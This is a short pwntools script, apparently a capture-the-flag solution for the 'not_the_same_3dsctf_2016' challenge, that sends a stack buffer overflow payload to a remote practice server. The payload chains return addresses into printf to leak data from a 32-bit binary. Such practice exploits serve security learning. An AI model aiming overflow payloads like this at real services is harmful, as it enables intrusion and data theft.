from pwn import *

#io = process('./not_the_same_3dsctf_2016')
io = remote('node4.buuoj.cn',27733)
elf = ELF('./not_the_same_3dsctf_2016')
raw_input()
context.log_level = 'debug'

payload = b'\x61' * 45 # + b'\x62' * 4 + b'\x63' * 4
payload += p32(0x80489A0)
payload += p32(0x8048a00) # ret
payload += p32(elf.symbols['printf'])
payload += p32(0x0804e660) # exit
payload += p32(0x080CDD51) # "trying file=%s"
payload += p32(0x080ECA2D)
#io.recvuntil(b'm3m0... ')
io.sendline(payload)

io.interactive()
